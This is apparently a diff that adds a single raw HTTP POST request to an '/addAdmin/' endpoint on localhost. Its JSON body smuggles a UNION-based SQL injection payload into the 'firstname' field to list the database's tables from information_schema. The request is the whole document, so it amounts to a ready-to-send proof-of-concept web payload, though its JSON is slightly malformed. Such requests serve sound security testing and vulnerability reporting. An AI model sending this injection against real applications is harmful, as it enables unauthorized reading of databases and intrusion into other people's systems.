@@ -1,0 +1,5 @@
+POST /addAdmin/ HTTP/1.1
+Host: localhost:8000
+Content-Type: application/json
+
+{"firstname":" UNION SELECT 1, table_name, 3 FROM information_schema.tables --","lastname":"test", "contactNumber":3, "address":"nair", "email": "a@em.com", password: "12"}
